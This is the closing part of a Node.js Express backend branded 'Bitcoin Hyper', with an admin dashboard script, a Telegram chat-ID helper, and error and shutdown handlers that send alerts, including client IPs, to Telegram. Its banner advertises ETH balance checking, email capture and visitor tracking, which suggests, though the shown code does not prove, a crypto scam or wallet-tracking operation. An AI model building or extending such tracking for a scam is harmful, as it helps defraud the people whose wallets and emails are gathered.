              showNotification('❌ Export failed: ' + error.message, 'error');
            });
          } else if (format === 'csv') {
            window.open('/api/admin/export?format=csv&token=' + token, '_blank');
            showNotification('✅ CSV export started...', 'success');
          }
        }
        
        function logout() {
          if (confirm('Are you sure you want to logout?')) {
            window.location.href = '/admin';
          }
        }
        
        function showNotification(message, type) {
          // Create notification element
          const notification = document.createElement('div');
          notification.className = 'notification';
          notification.style.backgroundColor = type === 'success' 
            ? 'rgba(16, 185, 129, 0.1)' 
            : 'rgba(239, 68, 68, 0.1)';
          notification.style.borderLeftColor = type === 'success' ? '#10b981' : '#ef4444';
          notification.style.marginBottom = '20px';
          notification.innerHTML = \`
            <h3>\${type === 'success' ? '✅' : '❌'} \${type === 'success' ? 'Success' : 'Error'}</h3>
            <p>\${message}</p>
          \`;
          
          // Insert at the top of dashboard
          const dashboard = document.querySelector('.dashboard');
          dashboard.insertBefore(notification, dashboard.firstChild);
          
          // Remove after 5 seconds
          setTimeout(() => {
            notification.remove();
          }, 5000);
        }
        
        // Auto-refresh every 30 seconds
        let refreshInterval = setInterval(() => {
          location.reload();
        }, 30000);
        
        // Stop auto-refresh when page is not visible
        document.addEventListener('visibilitychange', function() {
          if (document.hidden) {
            clearInterval(refreshInterval);
          } else {
            refreshInterval = setInterval(() => {
              location.reload();
            }, 30000);
          }
        });
      </script>
    </body>
    </html>
  `);
});

// Telegram chat ID helper
app.get('/api/telegram/chatid', async (req, res) => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    return res.json({
      success: false,
      message: 'Telegram bot token not configured'
    });
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
    
    if (response.data.ok && response.data.result.length > 0) {
      const chatIds = [];
      response.data.result.forEach(update => {
        if (update.message && update.message.chat) {
          chatIds.push({
            id: update.message.chat.id,
            type: update.message.chat.type,
            title: update.message.chat.title || update.message.chat.first_name,
            username: update.message.chat.username
          });
        }
      });
      
      const uniqueChatIds = chatIds.filter((chat, index, self) =>
        index === self.findIndex((t) => t.id === chat.id)
      );
      
      return res.json({
        success: true,
        chatIds: uniqueChatIds,
        instructions: 'Use one of these chat IDs in your TELEGRAM_CHAT_ID environment variable'
      });
    } else {
      return res.json({
        success: false,
        message: 'No messages received yet. Send a message to your bot first.',
        instructions: '1. Start a chat with your bot on Telegram\n2. Send any message\n3. Refresh this page'
      });
    }
  } catch (error) {
    return res.json({
      success: false,
      message: 'Error fetching updates',
      error: error.message,
      instructions: 'Make sure your bot token is correct and the bot is running'
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  
  // Send error to Telegram
  if (telegramEnabled) {
    try {
      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
      bot.telegram.sendMessage(
        memoryStorage.settings.telegram.chatId,
        `🔥 *CRITICAL ERROR*\n\nRoute: ${req.originalUrl}\nError: ${err.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
      );
    } catch (tgError) {
      console.log('Failed to send critical error:', tgError.message);
    }
  }
  
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: 'An unexpected error occurred. Our team has been notified.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    message: `The requested endpoint ${req.originalUrl} does not exist`
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER BACKEND v5.0.0 - REAL BALANCE CHECKING
  ======================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin
  🔐 Admin Token: ${process.env.ADMIN_TOKEN ? 'SET' : 'USING DEFAULT'}
  📈 Telegram: ${telegramEnabled ? 'ENABLED' : 'DISABLED'}
  📧 Email: ${emailEnabled ? 'ENABLED' : 'DISABLED'}
  💰 Real ETH Balance Checking: ENABLED
  🔥 Enhanced tracking: ACTIVE
  🌍 Country Flags: ENABLED
  📨 Email Capture: ENABLED
  `);
  
  // Initialize Telegram bot after server starts
  setTimeout(() => {
    initializeTelegramBot();
  }, 2000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  if (telegramEnabled) {
    bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🔴 *SERVER SHUTTING DOWN*\n\nServer is being terminated. Backend will be offline.\n⏰ ${new Date().toLocaleString()}`,
      { parse_mode: 'Markdown' }
    );
  }
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

module.exports = app;
